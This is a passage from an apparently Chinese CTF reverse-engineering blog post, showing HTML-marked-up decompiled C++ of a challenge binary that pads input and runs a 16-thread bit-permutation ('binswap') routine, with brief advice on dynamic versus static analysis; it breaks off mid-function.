class="line">  __int64 v66[<span class="number">2</span>]; <span class="comment">// [rsp+B0h] [rbp-D8h] BYREF</span></span><br><span class="line">  __int64 v67[<span class="number">25</span>]; <span class="comment">// [rsp+C0h] [rbp-C8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v67[<span class="number">17</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  input[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v54 = v66;</span><br><span class="line">  input[<span class="number">0</span>] = v66;</span><br><span class="line">  LOBYTE(v66[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  v3 = *(<span class="built_in">std</span>::<span class="built_in">cin</span>[<span class="number">0</span>] - <span class="number">24</span>);</span><br><span class="line">  v4 = *(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>[<span class="number">30</span>] + v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="built_in">std</span>::__throw_bad_cast();</span><br><span class="line">  <span class="keyword">if</span> ( v4[<span class="number">56</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v4[<span class="number">67</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>[<span class="number">30</span>] + v3), a2, a3);</span><br><span class="line">    v5 = <span class="number">10LL</span>;</span><br><span class="line">    v36 = *(*v4 + <span class="number">48LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v36 != <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::do_widen )</span><br><span class="line">      v5 = (v36)(v4, <span class="number">10LL</span>, <span class="number">10LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::getline&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, input, v5);</span><br><span class="line">  to_vec(hex_vec, input);</span><br><span class="line">  lenth = (LOBYTE(hex_vec[<span class="number">1</span>]) - LOBYTE(hex_vec[<span class="number">0</span>])) &amp; <span class="number">0xF</span>;</span><br><span class="line">  padding = <span class="number">16</span> - lenth;</span><br><span class="line">  v6 = operator new(<span class="number">16</span> - lenth);</span><br><span class="line">  src = v6;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="number">16</span> - lenth) &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="number">16</span> - lenth) &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *v6 = <span class="number">0</span>;</span><br><span class="line">      *(v6 + padding - <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v34 = padding;</span><br><span class="line">      <span class="keyword">if</span> ( padding )</span><br><span class="line">      &#123;</span><br><span class="line">        *src = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (v34 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">          *(src + padding - <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    index = src;</span><br><span class="line">    *src = <span class="number">0LL</span>;</span><br><span class="line">    v8 = padding;</span><br><span class="line">    *&amp;index[padding - <span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">    v9 = index;</span><br><span class="line">    v10 = (index + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">    v11 = (v8 + v9 - v10) &amp; <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v11 &amp; <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v14 = v13;</span><br><span class="line">        v13 += <span class="number">8</span>;</span><br><span class="line">        *(v10 + v14) = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v13 &lt; v12 );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = v60;</span><br><span class="line">  end = hex_vec[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( padding &gt; v60 - hex_vec[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( padding &gt; <span class="number">0x7FFFFFFFFFFFFFFF</span>LL - (hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>]) )</span><br><span class="line">      <span class="built_in">std</span>::__throw_length_error(<span class="string">&quot;vector::_M_range_insert&quot;</span>);</span><br><span class="line">    v38 = padding;</span><br><span class="line">    <span class="keyword">if</span> ( padding &lt; v37 )</span><br><span class="line">      v38 = hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>];</span><br><span class="line">    v39 = __CFADD__(v38, v37);</span><br><span class="line">    v40 = v38 + v37;</span><br><span class="line">    v41 = v40;</span><br><span class="line">    <span class="keyword">if</span> ( v39 )</span><br><span class="line">    &#123;</span><br><span class="line">      v41 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v42 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v40 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">      <span class="keyword">if</span> ( v40 &gt; <span class="number">0x7FFFFFFFFFFFFFFF</span>LL )</span><br><span class="line">        v41 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v48 = operator new(v41);</span><br><span class="line">    v15 = v60;</span><br><span class="line">    v42 = v48;</span><br><span class="line">LABEL_63:</span><br><span class="line">    v43 = hex_vec[<span class="number">0</span>];</span><br><span class="line">    v44 = &amp;v42[end - hex_vec[<span class="number">0</span>]];</span><br><span class="line">    v45 = (hex_vec[<span class="number">1</span>] - end);</span><br><span class="line">    v46 = &amp;v44[padding];</span><br><span class="line">    v49 = _mm_unpacklo_epi64(v42, (hex_vec[<span class="number">1</span>] + v42 - hex_vec[<span class="number">0</span>] + padding));</span><br><span class="line">    <span class="keyword">if</span> ( end == hex_vec[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(v44, src, padding);</span><br><span class="line">      <span class="keyword">if</span> ( !v45 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_65;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v56 = &amp;v44[padding];</span><br><span class="line">      v52 = hex_vec[<span class="number">0</span>];</span><br><span class="line">      v55 = &amp;v42[end - hex_vec[<span class="number">0</span>]];</span><br><span class="line">      memmove(v42, hex_vec[<span class="number">0</span>], end - hex_vec[<span class="number">0</span>]);</span><br><span class="line">      v43 = v52;</span><br><span class="line">      qmemcpy(v55, src, padding);</span><br><span class="line">      v46 = v56;</span><br><span class="line">      <span class="keyword">if</span> ( !v45 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">    &#125;</span><br><span class="line">    v52 = v43;</span><br><span class="line">    memmove(v46, end, v45);</span><br><span class="line">    v43 = v52;</span><br><span class="line">LABEL_65:</span><br><span class="line">    <span class="keyword">if</span> ( !v43 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_66:</span><br><span class="line">      v47 = _mm_load_si128(&amp;v49);</span><br><span class="line">      v60 = &amp;v42[v41];</span><br><span class="line">      *hex_vec = v47;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_70:</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(v43, v15 - v43)</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">  &#125;</span><br><span class="line">  memmove(hex_vec[<span class="number">1</span>], src, padding);</span><br><span class="line">  hex_vec[<span class="number">1</span>] = hex_vec[<span class="number">1</span>] + padding;</span><br><span class="line">LABEL_10:</span><br><span class="line">  v52 = v67;</span><br><span class="line">  <span class="built_in">memset</span>(v67, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  v61 = <span class="number">16LL</span>;</span><br><span class="line">  v62 = <span class="number">0LL</span>;</span><br><span class="line">  v63 = <span class="number">0LL</span>;</span><br><span class="line">  v64 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = operator new[](<span class="number">512LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  *v17 = <span class="number">0LL</span>;</span><br><span class="line">  v17[<span class="number">63</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(((v17 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL), <span class="number">0</span>, <span class="number">8LL</span> * ((v17 - ((v17 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">512</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  v18 = v62;</span><br><span class="line">  v62 = v17;</span><br><span class="line">  <span class="keyword">if</span> ( v18 )</span><br><span class="line">    operator delete[](v18, <span class="number">64LL</span>);</span><br><span class="line">  v19 = v52;</span><br><span class="line">  id = <span class="number">1</span>;</span><br><span class="line">  v21 = v52;</span><br><span class="line">  v49 = _mm_unpacklo_epi64(hex_vec, &amp;v61);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v57 = <span class="number">0LL</span>;</span><br><span class="line">    arg = operator new(<span class="number">0x28</span>uLL);</span><br><span class="line">    v23 = _mm_load_si128(&amp;v49);</span><br><span class="line">    *arg = &amp;off_556C970A5C80;</span><br><span class="line">    *(arg + <span class="number">8</span>) = id;</span><br><span class="line">    *(arg + <span class="number">32</span>) = binswap;</span><br><span class="line">    *(arg + <span class="number">16</span>) = v23;</span><br><span class="line">    v58 = arg;</span><br><span class="line">    <span class="built_in">std</span>::thread::_M_start_thread(&amp;v57, &amp;v58, &amp;pthread_create);</span><br><span class="line">    <span class="keyword">if</span> ( v58 )</span><br><span class="line">      (*(*v58 + <span class="number">8LL</span>))(v58);</span><br><span class="line">    v24 = *v19;</span><br><span class="line">    <span class="keyword">if</span> ( *v19 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">    ++id;</span><br><span class="line">    v19 = (v19 + <span class="number">8</span>);</span><br><span class="line">    *(v19 - <span class="number">1</span>) = v57;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( id != <span class="number">17</span> );</span><br><span class="line">  v25 = (v52 + <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::thread::join(v21);</span><br><span class="line">    v21 = (v21 + <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v25 != v21 );</span><br><span class="line">  v26 = <span class="string">&quot;%ld\n\n&quot;</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%ld\n\n&quot;</span>, hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>]);</span><br><span class="line">  reslut = hex_vec[<span class="number">0</span>];</span><br><span class="line">  v28 = lenth - <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( lenth - <span class="number">16</span> + hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = <span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">0</span>];</span><br><span class="line">      v30 = <span class="built_in">std</span>::<span class="built_in">cout</span> + *(<span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">0</span>] - <span class="number">24LL</span>);</span><br><span class="line">      v31 = v30[<span class="number">225</span>] == <span class="number">0</span>;</span><br><span class="line">      *(v30 + <span class="number">6</span>) = *(v30 + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFB5</span> | <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v31 )</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = *(v30 + <span class="number">30</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v32 )</span><br><span class="line">          <span class="built_in">std</span>::__throw_bad_cast();</span><br><span class="line">        <span class="keyword">if</span> ( !v32[<span class="number">56</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(v30 + <span class="number">30</span>), v26, reslut);</span><br><span class="line">          v33 = *(*v32 + <span class="number">48LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v33 != <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::do_widen )</span><br><span class="line">            (v33)(v32, <span class="number">32LL</span>);</span><br><span class="line">          v29 = <span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">0</span>];</span><br><span class="line">          reslut = hex_vec[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        v30[<span class="number">225</span>] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v30[<span class="number">224</span>] = <span class="number">48</span>;</span><br><span class="line">      *(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">2</span>] + *(v29 - <span class="number">24</span>)) = <span class="number">2LL</span>;</span><br><span class="line">      v26 = v24[reslut];</span><br><span class="line">      <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, v26);</span><br><span class="line">      reslut = hex_vec[<span class="number">0</span>];</span><br><span class="line">      ++v24;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v28 + hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>]) &gt; v24 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v62 )</span><br><span class="line">    operator delete[](v62, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v67[<span class="number">15</span>]</span><br><span class="line">    || v67[<span class="number">14</span>]</span><br><span class="line">    || v67[<span class="number">13</span>]</span><br><span class="line">    || v67[<span class="number">12</span>]</span><br><span class="line">    || v67[<span class="number">11</span>]</span><br><span class="line">    || v67[<span class="number">10</span>]</span><br><span class="line">    || v67[<span class="number">9</span>]</span><br><span class="line">    || v67[<span class="number">8</span>]</span><br><span class="line">    || v67[<span class="number">7</span>]</span><br><span class="line">    || v67[<span class="number">6</span>]</span><br><span class="line">    || v67[<span class="number">5</span>]</span><br><span class="line">    || v67[<span class="number">4</span>]</span><br><span class="line">    || v67[<span class="number">3</span>]</span><br><span class="line">    || v67[<span class="number">2</span>]</span><br><span class="line">    || v67[<span class="number">1</span>]</span><br><span class="line">    || v67[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_73:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">terminate</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  operator <span class="title function_">delete</span><span class="params">(src, padding)</span>;</span><br><span class="line">  <span class="keyword">if</span> ( hex_vec[<span class="number">0</span>] )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(hex_vec[<span class="number">0</span>], v60 - hex_vec[<span class="number">0</span>])</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input[<span class="number">0</span>] != v54 )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(input[<span class="number">0</span>], v66[<span class="number">0</span>] + <span class="number">1</span>)</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对无符号的C++程序静态分析的效果比动态分析的效率差很多 如果没有很强的反调试措施尽量通过动调来获取某个方法&#x2F;函数的作用 对于反调试措施强的程序可以通过方法&#x2F;程序中的报错信息来识别内置方法&#x2F;函数</p>
<p>其中开启线程进行加密的主要逻辑:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v49 = _mm_unpacklo_epi64(hex_vec, &amp;v61);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v57 = <span class="number">0LL</span>;</span><br><span class="line">  arg = operator new(<span class="number">0x28</span>uLL);</span><br><span class="line">  v23 = _mm_load_si128(&amp;v49);</span><br><span class="line">  *arg = &amp;off_556C970A5C80;</span><br><span class="line">  *(arg + <span class="number">8</span>) = id;</span><br><span class="line">  *(arg + <span class="number">32</span>) = binswap;</span><br><span class="line">  *(arg + <span class="number">16</span>) = v23;</span><br><span class="line">  v58 = arg;</span><br><span class="line">  <span class="built_in">std</span>::thread::_M_start_thread(&amp;v57, &amp;v58, &amp;pthread_create);</span><br><span class="line">  <span class="keyword">if</span> ( v58 )</span><br><span class="line">    (*(*v58 + <span class="number">8LL</span>))(v58);</span><br><span class="line">  v24 = *v19;</span><br><span class="line">  <span class="keyword">if</span> ( *v19 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">  ++id;</span><br><span class="line">  v19 = (v19 + <span class="number">8</span>);</span><br><span class="line">  *(v19 - <span class="number">1</span>) = v57;</span><br><span class="line">&#125;<span class="keyword">while</span> ( id != <span class="number">17</span> );</span><br></pre></td></tr></table></figure>

<p>要启动的线程函数, 线程函数的参数通过<code>arg</code>传入 线程函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">binswap</span><span class="params">(_QWORD *a1, __int64 *data_to_encrypt, <span class="type">unsigned</span> __int8 id)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 piece; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">signed</span> __int8 *v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v6; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">char</span> *nowpiece; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> trans; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int8 v12; <span class="comment">// bl</span></span><br><span class="line">  __int64 v13; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">signed</span> __int8 v14; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">signed</span> __int8 v15; <span class="comment">// r8</span></span><br><span class="line">  __int64 v16; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v18; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v20; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int8 *v21; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">signed</span> __int8 v22; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">unsigned</span> __int32 v23; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v25; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">bool</span> v27; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">signed</span> __int8 v28; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int8 *v29; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">signed</span> __int8 v30; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v32; <span class="comment">// [rsp+8h] [rbp-80h]</span></span><br><span class="line">  <span class="type">pthread_t</span> v34; <span class="comment">// [rsp+18h] [rbp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> threadid; <span class="comment">// [rsp+28h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [rsp+2Ch] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 base; <span class="comment">// [rsp+38h] [rbp-50h]</span></span><br><span class="line">  __int64 v38[<span class="number">9</span>]; <span class="comment">// [rsp+40h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  piece = *data_to_encrypt;                     <span class="comment">// data in vector</span></span><br><span class="line">  v38[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( piece != data_to_encrypt[<span class="number">1</span>] )            <span class="comment">// to end</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = a1 + <span class="number">25</span>;</span><br><span class="line">    base = <span class="number">0LL</span>;</span><br><span class="line">    v34 = pthread_self();</span><br><span class="line">    v32 = (&amp;unk_556C970A6280 + ((<span class="number">32</span> * (a1 + <span class="number">25</span>)) &amp; <span class="number">0x780</span>));</span><br><span class="line">    v6 = v32 + <span class="number">16</span>;</span><br><span class="line">    threadid = id;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      index = threadid;</span><br><span class="line">      v36 = <span class="number">16</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        nowpiece = (piece + (index + base));</span><br><span class="line">        v9 = *nowpiece;</span><br><span class="line">        trans = *nowpiece &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (*nowpiece &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          trans = <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>)] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">1</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">2</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">3</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">0x10</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">4</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">5</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">0x40</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">6</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">7</span>] - <span class="number">1</span>);</span><br><span class="line">        *nowpiece = trans;</span><br><span class="line">        v38[<span class="number">0</span>] = v34;</span><br><span class="line">        v11 = <span class="built_in">std</span>::_Hash_bytes(v38, <span class="number">8uLL</span>, <span class="number">0xC70F6907</span>uLL);</span><br><span class="line">        v12 = *v5;</span><br><span class="line">        v13 = *a1;</span><br><span class="line">        v14 = *v5 + <span class="number">1</span>;</span><br><span class="line">        v15 = *v5 + <span class="number">2</span>;</span><br><span class="line">        v16 = *a1 + <span class="number">1LL</span>;</span><br><span class="line">        v17 = v11 % (v16 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *a1 &gt; <span class="number">1uLL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v18 = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v19 = v16 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (v13 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v19 == v17 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v20 = <span class="number">0LL</span>;</span><br><span class="line">                  v17 = <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v20 = v17 &lt;&lt; <span class="number">6</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                v21 = (a1[<span class="number">1</span>] + v18 + v20);</span><br><span class="line">                v22 = _InterlockedCompareExchange8(v21, v14, v12);</span><br><span class="line">                <span class="keyword">if</span> ( v12 == v22 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">                <span class="keyword">if</span> ( v14 == v22 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v28 = v15;</span><br><span class="line">                  <span class="keyword">if</span> ( v14 == _InterlockedCompareExchange8(v21, v15, v14) )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">                &#125;</span><br><span class="line">                ++v17;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">LABEL_43:</span><br><span class="line">            <span class="keyword">if</span> ( v19 == v17 )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = <span class="number">0LL</span>;</span><br><span class="line">              v29 = (a1[<span class="number">1</span>] + v18);</span><br><span class="line">              <span class="keyword">if</span> ( v19 != <span class="number">1</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v29 = (a1[<span class="number">1</span>] + v18 + (v17 &lt;&lt; <span class="number">6</span>));</span><br><span class="line">              <span class="keyword">if</span> ( v19 - <span class="number">1</span> != v17 )</span><br><span class="line">              &#123;</span><br><span class="line">LABEL_45:</span><br><span class="line">                v30 = _InterlockedCompareExchange8(v29, v14, v12);</span><br><span class="line">                <span class="keyword">if</span> ( v12 == v30 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">                <span class="keyword">if</span> ( v14 == v30 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v28 = v15;</span><br><span class="line">                  <span class="keyword">if</span> ( v14 == _InterlockedCompareExchange8(v29, v15, v14) )</span><br><span class="line">                  &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">                    v17 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                    ++v18;</span><br><span class="line">                    <span class="keyword">if</span> ( v19 &lt;= <span class="number">1</span> )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">                    LOBYTE(v13) = v19;</span><br><span class="line">                    v16 = v19 + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          v28 = v15;</span><br><span class="line">          <span class="keyword">if</span> ( v12 == _InterlockedCompareExchange8(v29, v15, v12) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">LABEL_42:</span><br><span class="line">          ++v17;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">        &#125;</span><br><span class="line">        v28 = *v5 + <span class="number">2</span>;</span><br><span class="line">LABEL_53:</span><br><span class="line">        *a1 += a1[<span class="number">2</span>];</span><br><span class="line">        a1[<span 